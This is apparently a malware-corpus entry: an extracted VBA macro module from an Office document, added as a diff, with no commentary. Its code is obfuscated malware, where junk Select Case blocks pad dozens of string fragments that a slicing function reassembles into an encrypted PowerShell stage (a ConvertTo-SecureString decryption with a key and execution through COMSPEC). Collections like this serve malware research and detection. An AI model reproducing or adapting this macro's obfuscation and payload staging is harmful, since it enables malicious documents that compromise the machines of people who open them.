@@ -1,0 +1,645 @@
+Filename     : ./macros/a6e41fef1ff8cc44e9c035b45fde45788838454390a68c9102dd6cd9c384dba0
+OLE stream   : Macros/VBA/TfzzWaI
+VBA filename : TfzzWaI.bas
+----------------------------------------
+Attribute VB_Name = "TfzzWaI"
+Sub LbrVC(fwLNO)
+Select Case LcEsu
+Case 66219
+BDZoBF = CStr(19956 * Log(Jmnnm) * 18659 - AYItZ)
+zGJLt = 4585
+End Select
+End Sub
+Function pwnTqYKXS()
+On Error Resume Next
+Select Case UEcXla
+Case 57088
+IoUDql = CStr(74606 * Log(Nibilk) * 42180 - EijJqw)
+ULOWI = 29927
+End Select
+HOmsfoq = ltdHa("3zDkAMQBiAGYANwBiADYAMgA3ADQAZQBkADgANwAwADQAYQA1AGQAYgBiAGEANwBkAGIAYQA2ADIAZQA3ADAAMgAzADQAYgAxADcAYQBjADUAMQAxADUAYgBiADUAOQBkADIAMgBlAGQAOAA0ADIAOQAxADUAMgBjm4RN,", 3 + uzqUi - uzqUi, 159 + uzqUi - uzqUi)
+Select Case foWbYJ
+Case 35126
+HCtid = CStr(53402 * Log(RvkisT) * 5908 - UoJSzs)
+PdijDm = 15771
+End Select
+Select Case wzDObB
+Case 57836
+hWDXQA = CStr(16896 * Log(cPzRp) * 53382 - JQXAn)
+ZhpVtZ = 1485
+End Select
+UELfRKWj = ltdHa("jhaL]::SEcuresTRingtOGlobalallOcUnicoDe($('76492d1116743f042341l%wn8", 2 + LMQia - LMQia, 62 + LMQia - LMQia)
+Select Case SmCQzS
+Case 18329
+iITBPt = CStr(88815 * Log(VpVnt) * 96032 - BqCHp)
+CWaIh = 19749
+End Select
+Select Case TWwntV
+Case 33928
+HNDtOL = CStr(60999 * Log(MfiWU) * 24561 - TllAQE)
+PPrWIS = 89606
+End Select
+fqRuYJPGk = ltdHa("zgA4AGYAYwA2AGEAYwBlADYAMQBmAGUAOQBiADYAMwBlAGMAYgBmAGMANgA3A4OOin", 2 + zBpJBP - zBpJBP, 60 + zBpJBP - zBpJBP)
+Select Case DBwowf
+Case 45429
+piALu = CStr(7237 * Log(WKHsfC) * 15035 - AnVwo)
+sCNPV = 52848
+End Select
+Select Case Pizvsw
+Case 21809
+AHiWY = CStr(25454 * Log(GzOCu) * 18092 - sJUYv)
+SXoVq = 53339
+End Select
+fQYSVFdjsYC = ltdHa("kTn5AGQAYgBmAGEAOQA0AGEANABiADUAMAA3AGQAZQBmAGUAZAA1ADAAMQA0AGYANQBiADQAMgA5AGIAOAAwADgAZQAwADQAZgA0AGQAYwAyAGQANwAwAGIAMwBhASKzj", 4 + afOzvV - afOzvV, 122 + afOzvV - afOzvV)
+Select Case HdBYmG
+Case 10763
+BzIjWL = CStr(9940 * Log(irbWP) * 73551 - aTApAd)
+JjwiJ = 55843
+End Select
+Select Case MaKnR
+Case 77176
+LKviO = CStr(73718 * Log(IzRUdp) * 27875 - cuVCOB)
+qFlNjI = 20686
+End Select
+COuac = ltdHa("5MgBhAGMANQBkAGYAMAA0ADUAOQA2ADIANgBjAGEAMQA4ADUAMgAyADYAZQAzADgANwA4AGYAMAAzADMAOQA4AGYAYQAwADMAZQAzAGMAYgBmADQAOABkADYANgBiADIAMwBlADcAMgBmADcAYgAzAGEAMAA5ADIAMQA4ADEA5zbT2HlN", 2 + pQnDUq - pQnDUq, 168 + pQnDUq - pQnDUq)
+Select Case jjclH
+Case 47151
+wtwIE = CStr(7438 * Log(Rvkrh) * 94875 - ROZUh)
+pzBCj = 94877
+End Select
+Select Case HksRRP
+Case 89834
+lQWwJ = CStr(16840 * Log(sCYUbG) * 4040 - hHfrLb)
+HzvoN = 24402
+End Select
+INkpbb = ltdHa("AN%2AGCj", 5 + inAEHG - inAEHG, 2 + inAEHG - inAEHG)
+Select Case QlqwNX
+Case 35151
+EwBwD = CStr(9469 * Log(SFVFAL) * 19725 - YjuiIZ)
+Uukwm = 74765
+End Select
+Select Case bUqrlC
+Case 55516
+DkZcI = CStr(98972 * Log(WFEnDv) * 23993 - tbiqb)
+clbVF = 55889
+End Select
+fjcTsGV = ltdHa("27GCAMQAyAGUAYQBhAGQAMgBiADgAMwBjADAAMABhAGEAZAA0AGYAYwAwAGMANABkADgAZQAyAGUAYgA1AGYANgBiADgAZQAzADEAZABiADQAZQA5AGYAOQA2AGMAYwAwWX", 5 + dsiSOC - dsiSOC, 125 + dsiSOC - dsiSOC)
+Select Case IatmN
+Case 688
+zEKqwk = CStr(44244 * Log(AsvwOP) * 93634 - DLBub)
+zGCWlO = 60094
+End Select
+Select Case CHTis
+Case 45280
+SMGrVR = CStr(54218 * Log(XzZjH) * 95928 - KRSWK)
+hwzHpQ = 51272
+End Select
+JwTmAREwIp = ltdHa("kFwF3ADgAOAAzADUAYwAwADYAMAA3ADYANwAzAGMAMwA1ADMAMwBkAGYAOQA4AGUANgA2AGEAMQA2ADAAYQBkAGYAZAAzAGMAMgAyAGMAZgBhADYAYwBlADUAYgAxADQAYwAzAGUAMgAxADgAYgA3ADkANgA3AGEAMAA4ADUAZABlAGMAMwEV", 5 + ApuaH - ApuaH, 175 + ApuaH - ApuaH)
+Select Case wapqLB
+Case 60068
+jaZtqC = CStr(82680 * Log(dXLkwC) * 30644 - MBkQJ)
+fBBfbY = 68827
+End Select
+Select Case jPtFfV
+Case 80341
+ZNdaBV = CStr(18084 * Log(ZSLVGT) * 54479 - aVjbR)
+YwPvu = 51651
+End Select
+WpqupzdbKb = ltdHa(".hyADIAZAAyADEAZAAzAGEAZgA1ADQAZAA4AGEANJ7kIL", 3 + vwmdks - vwmdks, 38 + vwmdks - vwmdks)
+Select Case hsYBF
+Case 35837
+zNtNA = CStr(26444 * Log(OfMVMn) * 78505 - JpOSEo)
+KFbinr = 50007
+End Select
+Select Case BmDvH
+Case 86123
+KzzmK = CStr(10478 * Log(JwHtqj) * 72326 - IqvbZ)
+dEqtj = 84844
+End Select
+DfUMYwYz = ltdHa("q8A2GUAMABhADkAMAAzAGYAOQAxAGEAO8j", 5 + UBAXEN - UBAXEN, 28 + UBAXEN - UBAXEN)
+Select Case TiOhnk
+Case 37510
+XnBzu = CStr(25217 * Log(dHURlt) * 57304 - zfTwj)
+HsaNpq = 30428
+End Select
+Select Case bSfGXi
+Case 15564
+jJoIYD = CStr(74046 * Log(Pzbdl) * 22750 - TCCjU)
+FNkpb = 61062
+End Select
+RmhUGRd = ltdHa("FkAOQA2ADAAZQBjAGQANAA5AGUANQA4AGUAOQBlADYAMQBlAGQAOQBmADcAOAA0AGMAMwA2ADMAMQA5ADYANABmADEAZABhADMANABkADYANwAzAGYAYgAyADcAYQA2AGQAOQA2ADQAMgA1AGYAYgBhAGIAYwA4ADQANw%70w0", 2 + MDwSzk - MDwSzk, 164 + MDwSzk - MDwSzk)
+Select Case KTRlj
+Case 5306
+nznYHW = CStr(66231 * Log(zTRGP) * 13263 - EUuoW)
+wETzXl = 8657
+End Select
+Select Case ldfQW
+Case 91440
+TwlYi = CStr(79771 * Log(jAsfW) * 61009 - IdZBN)
+XRUFR = 33417
+End Select
+VlJuMZ = ltdHa("VsOABiAGMANQAzADgAMwBjAGEAYgAyADYAOQAzAGQAMAA3ADEAZQA4AGYAMAAzADUAZAAzAGIAYgA3AGQAOAAwAGMAYgA3ADcAMwA5ADMAMAA1AGYANwBlAGUANQBjADcANgA0ADMAYwA3AGIAMABhADkAMgBiADQAOQAxADkANQA@QMH", 3 + ipwikX - ipwikX, 171 + ipwikX - ipwikX)
+Select Case mXHmap
+Case 17732
+cWAXzF = CStr(55102 * Log(jTEOW) * 55011 - FOIdiC)
+jHNLYJ = 87731
+End Select
+Select Case OvzwlS
+Case 62579
+taCAc = CStr(35930 * Log(zOWjHv) * 51115 - GACAG)
+tRYwn = 29940
+End Select
+CvhaimhcqV = ltdHa("kA0ADYANAAwAGQAZgA1ADUANgBjADYANgAyAGIAMgAyADcAYwA1AGEAMQA2AGYAMgBlADUANAA2ADUAZQAzADMAMAA0AGYAYgAzADcAYgA0AGIAMgAwAGMAOQA0AGEANNiEwc4H", 2 + FhWOf - FhWOf, 127 + FhWOf - FhWOf)
+Select Case jWnNv
+Case 53873
+zmJYu = CStr(9416 * Log(ZzMnw) * 76849 - rziRZ)
+zIdDpD = 9672
+End Select
+Select Case zlnwqL
+Case 71383
+riOmQ = CStr(71615 * Log(sRMWJw) * 42574 - tpwNkj)
+EBdos = 6017
+End Select
+zOdnzKqXti = ltdHa("qz%Av4DcANQAzADkAZQAxAGIAMQAyADgANAA2ADgAYgA4AGUAMQA5ADAAZgAwAGIANAA3AGUAOAAxAGQANgA2ADcAZABmADMAYQBhADAAMwBlADMAYgBjADYAZQAyAGIAJMm", 7 + riWMT - riWMT, 123 + riWMT - riWMT)
+Select Case kUZKw
+Case 20674
+XOEwZ = CStr(6140 * Log(Huqobq) * 89546 - uwBjd)
+NIcsl = 83294
+End Select
+Select Case HmSDk
+Case 1870
+OaowZB = CStr(10166 * Log(mNOnUT) * 79906 - twaQa)
+EPvdXc = 84217
+End Select
+jBBBTEY = ltdHa("KmAGYAOQA0ADIAOQA2ADMANQA2ADIAYwAyAGYAYgA1AGIAMQA2ADkAOQBlADQANwA2AGUAYQBmADUANAA1ADYAYQBiADgANgA0ADQANgBmAGIAMwA0ADUAMgA5AGEAYQAzADUAOAAzAGYAMwA0AGYAOAA4AGUAOAA5ADgAMQAzA2b06b", 3 + szzwLZ - szzwLZ, 169 + szzwLZ - szzwLZ)
+Select Case HkOkI
+Case 81765
+lkuFPI = CStr(37603 * Log(jYzSjY) * 13739 - kCkWY)
+vdctZ = 10971
+End Select
+Select Case LnwIv
+Case 25782
+DnuqYO = CStr(84978 * Log(bPAna) * 42212 - wOzHsK)
+zsfYDW = 3258
+End Select
+LDGFiHcR = ltdHa("n5JWDEANAA1AGEAMgAn%,51", 5 + ZjKzGI - ZjKzGI, 14 + ZjKzGI - ZjKzGI)
+Select Case NqodfD
+Case 80899
+hhLniS = CStr(76268 * Log(Ypkpi) * 18114 - VccqCL)
+LVBlBJ = 97612
+End Select
+Select Case XGzTSW
+Case 54020
+NEMrGL = CStr(95860 * Log(ovYSa) * 70152 - IZkUz)
+SGfZC = 62262
+End Select
+zCbKijUW = ltdHa("nKBiADYANgA0ADIAZgBhADAAYQBlAGYAMgAxAGYAZgAyADkAZAA4AGUANwA1ADEAZABmAGMANAA0AGUANwAyADUAZQAwAGQAMwBkAGMAOQAwAGIAOQBmAGMAYgA5ADkAMwA3AGQANwBiAGYANgA5AGYANQBiADEANwBiTADaH", 3 + qWIjSZ - qWIjSZ, 162 + qWIjSZ - qWIjSZ)
+Select Case mcwDqt
+Case 571
+TNGbh = CStr(51807 * Log(HRSHnv) * 79063 - iCcivz)
+REfNhM = 98537
+End Select
+Select Case vYSmr
+Case 20339
+IpWccI = CStr(45228 * Log(vUbLMX) * 81866 - Bsqvm)
+ibbJHj = 93310
+End Select
+jXOhww = ltdHa("n%fn355ADcAZQBkADEAMQAyAGIAZQA0AGYAZAAyAGMAMwAwAGQANAA5ADIANAAxAGYAZQA1AGIAMwA4ADQAZAA3AGQAOQA1ADcANQBkADIAMgA2ADAAZQA4ADIANwAwADEAMgA3ADQAMgAzADgANQBkADYANQBiADG.", 7 + bhkrp - bhkrp, 155 + bhkrp - bhkrp)
+Select Case blmCYd
+Case 41246
+oLSCCi = CStr(65358 * Log(rmFSRu) * 2012 - IWKuA)
+BnmKs = 81882
+End Select
+Select Case hSdWI
+Case 2281
+kITpz = CStr(46140 * Log(GAqEvw) * 98683 - SzWMi)
+sQtjm = 71206
+End Select
+jjJbVENN = ltdHa("zGbBmAGQANwAwAn0tk", 4 + JzNkL - JzNkL, 11 + JzNkL - JzNkL)
+Select Case QsaLqo
+Case 33060
+PspXck = CStr(25709 * Log(RSMZKA) * 57163 - vWFsra)
+LmwpI = 29351
+End Select
+Select Case pwsJN
+Case 42114
+qvafh = CStr(12100 * Log(CQEwfn) * 54639 - lQHFFC)
+UoKwuY = 42657
+End Select
+jqcKaEr = ltdHa("wA4ADUAMgA0AGQAMAA2ADIAZgBmADAAMQA3AGYAYgBkADkAZgAyADkAMQAxADQANwBhADZ0Fsm", 2 + FHiuDH - FHiuDH, 68 + FHiuDH - FHiuDH)
+Select Case tITQB
+Case 13032
+plGlpr = CStr(7077 * Log(iXnsMc) * 2939 - QHKam)
+jMJjH = 20267
+End Select
+Select Case uowmJ
+Case 51816
+Nmdtk = CStr(90833 * Log(DDpQl) * 37208 - hMARvF)
+CwNnbh = 47931
+End Select
+EvLEsIaN = ltdHa("z6t2QBjAGQAMgA1AGEAZQBiAGQANAAwAGEAMQBlAGMAMgBiADkAMQA3ADMAMAAxADgAYQA5ADcAMQBjADgAYwA2ADQANABhADAAYgBlADkAYgBjAGUAZAAyAGUAYQAxADAAZAzz", 5 + MXapIa - MXapIa, 129 + MXapIa - MXapIa)
+Select Case tSuzJ
+Case 82507
+QjUjAp = CStr(5642 * Log(FkYiNc) * 96085 - OVZKn)
+FJNmn = 19487
+End Select
+Select Case taFHmC
+Case 58536
+tjpQck = CStr(87935 * Log(OaREuh) * 93593 - zlrzA)
+CJwHB = 23430
+End Select
+VPIBB = ltdHa("wZgAwADEAMQA2AGQAZAA1ADMAZgBiADAAYgA3ADQANwAzAGUAOAAxADEAZAA3ADIAZQA2AGlInLi6M", 3 + VoJzs - VoJzs, 69 + VoJzs - VoJzs)
+Select Case hDzcrf
+Case 43066
+zNXVmO = CStr(67797 * Log(PpMioH) * 2561 - ichhf)
+VjhFj = 44304
+End Select
+Select Case unScrC
+Case 16451
+GSaozK = CStr(18850 * Log(SHmmYP) * 42109 - mviipn)
+vSqmC = 27901
+End Select
+ZUqos = ltdHa("nV@8QA5AGUANwA2ADEANwA5ADIANQAwADIAYQA5ADAAUT.a4", 5 + cDBaR - cDBaR, 39 + cDBaR - cDBaR)
+Select Case PdniXK
+Case 89263
+ZnnRwT = CStr(28413 * Log(PiSZp) * 92189 - aHTIi)
+IYGSf = 84231
+End Select
+Select Case RpjwKU
+Case 70053
+BbJAw = CStr(84274 * Log(TFQKBE) * 44443 - izsQPi)
+FXKYRK = 42328
+End Select
+rhzcZNO = ltdHa("NNcAGQAOQBmADAAMQA2AGMAOAA4ADcANgBjADUANgBiADgANAA2ADUAZgA1ADIAZAA2AGQANgA1ADUAYwBhADEANQAyADAAZQA1AGUAMQBjAGQAOQBmAGQANAAyADkAYgAwAGIAOAA0ADQAMg7zno", 4 + zqrKw - zqrKw, 142 + zqrKw - zqrKw)
+Select Case FEpKZP
+Case 87393
+fVlZS = CStr(32993 * Log(afuOEB) * 34229 - UYVVl)
+ZZVzcL = 11998
+End Select
+Select Case rvoiUW
+Case 55762
+jpVzL = CStr(55304 * Log(kzjmYa) * 59671 - zpQOrz)
+QfhEW = 65156
+End Select
+wnYqUPdTbWP = ltdHa("C08znOQAwADMAOAA5AGQANABmAGIANQA1AGEANQA5AGEANgA4AGQAMwBiAGMAYwA5AGMAYwBhAGYAMwA0ADkAZQA0AGIAYQAxADMAYwA1ADcANQAyADUANgBlADEAMABiAGYAYwAwADHOi", 6 + tzMli - tzMli, 134 + tzMli - tzMli)
+Select Case AtwiYJ
+Case 15684
+kiBaKM = CStr(62269 * Log(ATMMrs) * 8312 - lFcZq)
+HGJBw = 74160
+End Select
+Select Case zWwzGh
+Case 5944
+GBDdVo = CStr(4022 * Log(qKBiEu) * 41851 - Ddiqw)
+BNUVi = 18770
+End Select
+rnpYz = ltdHa("ckW,DXvAGIAYQBiADAAMwA1ADEAMwBjADAAZAA0AGIANQA3AGEANQBkADgAZAAzADQANwAzADgANAA3ADAAMAAzADAAMwAzADUAMQA5AGYAZQBmAGQANwA5ADkAMAA1ADgAMABiAGUAYwA0ADcANwAzAGYANwBhADYAMQBmADMAHz", 8 + tCVaOF - tCVaOF, 164 + tCVaOF - tCVaOF)
+Select Case FTnPoI
+Case 37997
+RBMwu = CStr(16328 * Log(zTYEB) * 44533 - dwMwjz)
+JAJsFl = 82793
+End Select
+Select Case AAwTUF
+Case 92569
+KqjEQo = CStr(57678 * Log(Kccdfz) * 20057 - baiXM)
+iYJmc = 57327
+End Select
+pLHpo = ltdHa("2NDUAOQA1ADkAZQAwAGEAMAA0ADEANABjADcAOQA5ADkANgAxADEAZQA4ADkANABmAGUAZQA2ADkAYQBiAGY.m0.2lC", 3 + PQmCG - PQmCG, 82 + PQmCG - PQmCG)
+Select Case wWJvLS
+Case 14018
+DsRZM = CStr(1665 * Log(XaQAp) * 70275 - ubYVvM)
+viLAA = 22837
+End Select
+Select Case GiuFVN
+Case 2861
+VUiRIi = CStr(22296 * Log(tGCiJ) * 33480 - YiaKv)
+PPOLX = 3286
+End Select
+MdDXESUVu = ltdHa("OX%cYANAA3ADYANwAwADAAZQBiAGUAZgA4AGEAYgBlAG7F8", 5 + ShUhD - ShUhD, 40 + ShUhD - ShUhD)
+Select Case WNlLmo
+Case 3200
+GHAXDl = CStr(41650 * Log(tlioV) * 43483 - uCGTG)
+TGlci = 61760
+End Select
+Select Case GYzNVZ
+Case 21497
+YaXJW = CStr(92089 * Log(IrfwK) * 54663 - lwIowQ)
+oqEnOM = 2789
+End Select
+PDEQjD = ltdHa("nPGUAZQBmADYAYQBkADQAMgA1ADAANgA3AGQAMwA0ADUANABkADgAMgA4ADgANgA5AGIAYgA0ADcAYgAzADUAYgBmADYAZgAwAGQAYQAzADYANQA1ADgAOQBiADIAZQBiAGEAMwA0ADkAYgBaZNc8FQ", 3 + VqvUPk - VqvUPk, 142 + VqvUPk - VqvUPk)
+Select Case zzLWj
+Case 4489
+WMWVV = CStr(48444 * Log(IYMBOm) * 5038 - hbuRj)
+SWIjLD = 87946
+End Select
+Select Case BMUlH
+Case 74714
+jBoGA = CStr(26709 * Log(NMEvv) * 84022 - KEbOTP)
+PfzFMi = 78713
+End Select
+hbOmkzzZV = ltdHa("FFmIiADMANQA1ADUANQA3AGEAMgAwAGIAOQBiADIAYwAwADgAMQAzADAAOAA5ADMANgA5ADEAZgBjAGYAMwA1ADMANQA2AGIAYwA3ADYAOQBmAGEANQBkADAAYQAwAGQAOABhAGQANQBhAGIANwBjADYAls4", 5 + kntpRZ - kntpRZ, 149 + kntpRZ - kntpRZ)
+Select Case XkzEq
+Case 45789
+ESlli = CStr(30193 * Log(mlVDbq) * 16107 - WoXiQV)
+BofSop = 37696
+End Select
+Select Case HaozRi
+Case 83675
+ANEVL = CStr(92216 * Log(YsMjO) * 40722 - CDMYZa)
+PkjPr = 8807
+End Select
+SqJsr = ltdHa("YwTGYANAAwADkAOAA2AGMAYQA4AGMAMABlAGQAOABjADMAMgAzADIAMQA2ADkAYQBkAGIANgA3ADkAZQAyADAAOAAxADUAMgA5AGUAMQAzADgAOQAzADUANAA5ADgAMQAxADIAZgBjAGQAYQAzADcANgARHIAK", 4 + qBTmzI - qBTmzI, 150 + qBTmzI - qBTmzI)
+Select Case wsOrh
+Case 74785
+MTjvC = CStr(50784 * Log(CIYfdN) * 46351 - mtJRok)
+YFTrJc = 712
+End Select
+Select Case iHVLtp
+Case 13846
+djLCcK = CStr(17194 * Log(cijLi) * 84409 - ofUFzY)
+TvYXL = 84923
+End Select
+oRndTbQ = ltdHa("wDAANwA1AGEANQBjADYAZgBhADMAZAAw%YlX.ll", 2 + ohippk - ohippk, 31 + ohippk - ohippk)
+Select Case wqkElu
+Case 12405
+RaBom = CStr(34000 * Log(FkAmY) * 64333 - YjJHRM)
+dFzQm = 58040
+End Select
+Select Case ZKcwIR
+Case 70779
+NIsFc = CStr(26652 * Log(RirfQr) * 50501 - KocRLP)
+aZnaMb = 58014
+End Select
+LBMBrqn = ltdHa("@wKHANgBkAGFlFH", 5 + zHwzch - zHwzch, 7 + zHwzch - zHwzch)
+Select Case asiNKo
+Case 15812
+sjXnFY = CStr(39560 * Log(kzRRI) * 60755 - ZGNiT)
+CBInv = 32702
+End Select
+Select Case rQYqln
+Case 27023
+POCIBL = CStr(27314 * Log(llrWf) * 21011 - itWSD)
+sYmiRN = 15509
+End Select
+cRIIFk = ltdHa("nTl5EAMwA1ADgAYQBjADAA'|&('C'+'oNVerttO'+'-'+'secuREstrING') -KEY  (161..184)))) )| &( $eNV:COMSPec[4,15,25]-Join'')DF", 5 + idQECH - idQECH, 112 + idQECH - idQECH)
+Select Case sJjQv
+Case 27429
+tSzQHc = CStr(82322 * Log(jswjNt) * 93792 - VKvXq)
+ikzGz = 86140
+End Select
+Select Case jNvzD
+Case 81398
+Aiikbd = CStr(26305 * Log(hilUwS) * 69542 - rIRIkW)
+wKQkuv = 84393
+End Select
+EbfZzv = ltdHa("wAyAGQANwA4ADIAOQA5ADMAZgBlAkwJaY2", 2 + HGkwVl - HGkwVl, 27 + HGkwVl - HGkwVl)
+Select Case dDsCs
+Case 83370
+jUpDt = CStr(48602 * Log(VXBzZ) * 7807 - mhHiAj)
+KsTDpQ = 15430
+End Select
+Select Case OCERzS
+Case 4550
+kIwsI = CStr(74202 * Log(GTQubw) * 5934 - pMlnp)
+NnJVBb = 72062
+End Select
+CPMIYoF = ltdHa("AkANgAwADcANgBjADA,TG% q", 2 + EQrzc - EQrzc, 17 + EQrzc - EQrzc)
+Select Case EANWi
+Case 11625
+cEdHYF = CStr(67477 * Log(QvwLAO) * 9058 - iNlWV)
+XHLCEP = 30224
+End Select
+Select Case FkEBm
+Case 91086
+BDaWS = CStr(24604 * Log(ljHnM) * 59473 - FdMqLh)
+UqkqSk = 79680
+End Select
+rUqav = ltdHa("s4hF,ZAA0ADcAMwBkADIANFJ", 6 + EUzaNI - EUzaNI, 17 + EUzaNI - EUzaNI)
+Select Case GSWoWA
+Case 15282
+jRYMv = CStr(22223 * Log(DYnGz) * 13989 - KaOIjN)
+fAbMwa = 79099
+End Select
+Select Case zdkYBR
+Case 5897
+nzwiiw = CStr(45480 * Log(wMPwV) * 58348 - XLMNPq)
+EhrKrs = 28246
+End Select
+uaRANrjwvq = ltdHa("wAA5AGQAOAAwAGIAOQBhADEAYwA5ADIAOQA3ADYANwAwADAAYQAz%uku22", 2 + XItzQ - XItzQ, 51 + XItzQ - XItzQ)
+Select Case hcOOf
+Case 75354
+TqLKtz = CStr(73797 * Log(raVtNN) * 79292 - nuLvP)
+UFfvwi = 75579
+End Select
+Select Case lnWzD
+Case 79525
+uDhrr = CStr(76398 * Log(VIHwH) * 37269 - zSkii)
+MuNOuq = 92151
+End Select
+wpTktf = ltdHa("1gAZgBm.MwimP", 2 + GzwcrV - GzwcrV, 6 + GzwcrV - GzwcrV)
+Select Case LYdvmn
+Case 62868
+kIKcLD = CStr(24958 * Log(ZcvzlV) * 74206 - ZvJAq)
+wBrbK = 69525
+End Select
+Select Case CrzYil
+Case 77042
+NkJWum = CStr(15221 * Log(jPrKS) * 51523 - RRXJk)
+Xdjdh = 18202
+End Select
+PoUDfWMq = ltdHa("H1ADEAZQA4ADEAOQAxADUANwA2ADcAYQBmAGYANwA3ADQANwA4ADgAZgA1AGMAMAAwAGUANwBhADQANgA4ADYAOAA4ADAAZgBmADcANwBmADYAMQAxADQANQAAJ57q", 2 + DVfWMi - DVfWMi, 120 + DVfWMi - DVfWMi)
+Select Case zrakf
+Case 67916
+mJjjY = CStr(79723 * Log(uzrdP) * 52756 - hHGcD)
+qHdsNd = 66846
+End Select
+Select Case SSPCr
+Case 92326
+zcCsn = CStr(69905 * Log(FldzZp) * 2266 - FlFkp)
+jIGvP = 68334
+End Select
+JzaiwDUUqV = ltdHa("maUANQAyAGQANABhADEAZAAwAGUAZgAyADkANwAzADMAOQA4ADQAZQA5AGUANgBiADcAMQBlADkAMQA2AGYAZQBlADAAYwA5AGMANQBhAGUAMgAwADYAYQAxADQANwAxADEAMwBlADYAOQBkADQAYQAzAncq25", 3 + soHij - soHij, 151 + soHij - soHij)
+Select Case IRDkBB
+Case 82504
+iiiUH = CStr(61801 * Log(runQPw) * 24193 - zHGNTT)
+zYAKwT = 49312
+End Select
+Select Case DvkmYj
+Case 57994
+wlbSXE = CStr(19909 * Log(unqYD) * 8506 - CQbsTm)
+HwfchV = 53058
+End Select
+OCXnWZa = ltdHa("3WV mQBmADQAMQA0AGYAMABhAGYANgBiADMAMwBkADAANQAxAGQAOQA5ADQAZQA2AGMAZQA5AGIAMwAyAGYAZABlAGMAYQAyADYAYwBkAGUANgBjAGQAYgBlAsn", 6 + YoKJX - YoKJX, 116 + YoKJX - YoKJX)
+Select Case MKOzj
+Case 13398
+zZDCSq = CStr(66424 * Log(ilwwi) * 42262 - qKMAdd)
+uWomkb = 62035
+End Select
+Select Case ZbWbuv
+Case 73822
+vTQQi = CStr(90732 * Log(tYspDs) * 73471 - OtiCdL)
+vzUFnL = 73071
+End Select
+DBwnjUiThY = ltdHa("@AGEAZgA4AGMAZgBiAGYANgAwAGIAYgAzADkAYgAyADYANwAzAGYAOAA4AGEAYwBmADEANwA1ADQAYQU.z@ml", 2 + DXqGT - DXqGT, 78 + DXqGT - DXqGT)
+Select Case OICsWm
+Case 18142
+ZTaruZ = CStr(38435 * Log(unpIhP) * 86170 - zDYTw)
+HiHcih = 1340
+End Select
+Select Case oFDOV
+Case 70254
+aCojBn = CStr(1668 * Log(ZazkBi) * 51070 - jsMVo)
+aOYfRR = 58850
+End Select
+SHDGTtscGPP = ltdHa("GTEAOQBhADUANwBjAGYAZgAwADAAOAA5ADMAMwAyADAAYwBmAGMAZQBhADUAOQA2ADIAZQBkADcANwAzAGMAMQBkADIANABhAGQAZQA0ADIAOAAxADEANgBmAGYAYwAzADUAYwAxADYAMO%aFOww", 3 + PAEzF - PAEzF, 139 + PAEzF - PAEzF)
+Select Case NVzcCi
+Case 73854
+mSlXol = CStr(1513 * Log(caOCUW) * 17177 - AsbZH)
+VjOwN = 57072
+End Select
+Select Case SUWwBG
+Case 10931
+fZhrc = CStr(34121 * Log(dsTUDS) * 69173 - vVvTzE)
+bCdpi = 25645
+End Select
+DDvGzrkw = ltdHa("A2AYQBkAGYAOQA4AGIANwBlADYAYQAzADUAMABkADQANQA3ADgAOAA3AGEAZQA2AGQAOQBkADkAMAA0ADMAYQBhADMAMgBiADIAMAA1ADgANQA5ADkAOAA0ADkAYwBmADYANwAwADgAZQBkADYAOz.JX@iz", 3 + YcvQkF - YcvQkF, 146 + YcvQkF - YcvQkF)
+Select Case GQkTsO
+Case 21053
+izfGO = CStr(37269 * Log(jMjiXb) * 55201 - mICYz)
+Nnnksl = 7269
+End Select
+Select Case BalZzK
+Case 6369
+hNjNV = CStr(9652 * Log(rjhiGc) * 17931 - QPtniG)
+djDGtv = 66980
+End Select
+AMrinlJM = ltdHa("AUANQBlADMANgA3ADcAOABjAGEAYQBkAGYAYwBkADMAMABmAGQAZQAzADUAMAA1ADYAMQAxAGMAMQBkADMANwAzADgAOQA3ADEAYwA5ADMAYQAzADQANABhAGIAYgBmADQAMAA4AGMANgAyADMAYQBiADAANQAzAGYAOAA0AGIAYQBlAGUANABjAQlubAaQk", 2 + jaVllq - jaVllq, 183 + jaVllq - jaVllq)
+Select Case mPmjAp
+Case 68555
+ftzlWN = CStr(77595 * Log(DrjUK) * 11826 - YPFkA)
+OLzJB = 89915
+End Select
+Select Case pEtocW
+Case 72585
+KuOMCQ = CStr(47508 * Log(cRrJUk) * 51151 - lJRLT)
+tpVKt = 83959
+End Select
+iVWaWw = ltdHa("Ou5fwADYAYgBhAGMANQBhAGMANQA2AGEAZgAzADcAYQBhADcAMQAzADIAMwBXE", 6 + UvIBh - UvIBh, 55 + UvIBh - UvIBh)
+Select Case ERwskl
+Case 88363
+HTfLw = CStr(45616 * Log(jBNEdj) * 5299 - EaVuA)
+rsWhw = 45867
+End Select
+Select Case nAMrf
+Case 53017
+zdnik = CStr(17441 * Log(KwKPoG) * 62156 - bsocz)
+htjdI = 13438
+End Select
+GSMwB = ltdHa("f0OAOQA2ADQAYQA2AGIAYwBkAGYAlka4", 4 + uRjzjH - uRjzjH, 25 + uRjzjH - uRjzjH)
+Select Case mSWjB
+Case 16772
+OfpwK = CStr(75398 * Log(YSFlj) * 64280 - YTDDdI)
+kGFcC = 51477
+End Select
+Select Case kiEvE
+Case 77350
+UtWTfi = CStr(49133 * Log(HZjnU) * 24028 - wuaVz)
+McTQaT = 46668
+End Select
+BklbGjIJ = ltdHa("isYMgBmADMAYgBkAGEAYwAwAGEAZABkADgANgA4ADcANQBiADIANQA5AGIANwBjADUAYwA4AGMAZAA0ADYAYwAwADYANAA4ADEAMQBkAGMAMgBhADkAZgAyADIAMQAxADgANABiADUAMwAyADkBwva", 4 + dofmw - dofmw, 142 + dofmw - dofmw)
+Select Case REJJFz
+Case 56989
+zfTozo = CStr(55643 * Log(zhBfm) * 18847 - jqDHQ)
+DEKBT = 82245
+End Select
+Select Case IvCIPQ
+Case 59873
+OUlMG = CStr(34561 * Log(kOFoLo) * 18298 - TtjMR)
+qdHXPN = 38963
+End Select
+cwYwXpT = ltdHa("z0DQANwA5ADIAOQA0ADMANQBjAGQANAA3ADgAOQA3ADEAMgAyADAANQBmADkANQBhAGQAOQAzADQAZgBmADIANwA2ADAAMQA1ADYAMgA0ADkANABlADkAMQBjADQCO6jzCI", 3 + ZdONc - ZdONc, 122 + ZdONc - ZdONc)
+Select Case rEcqw
+Case 21181
+oiVND = CStr(71149 * Log(DDbIwW) * 68834 - jDNiY)
+doqESk = 43324
+End Select
+Select Case sYPkBv
+Case 34210
+hOaFQ = CStr(95080 * Log(wjnjMU) * 46136 - tNCtc)
+HWXQMc = 76380
+End Select
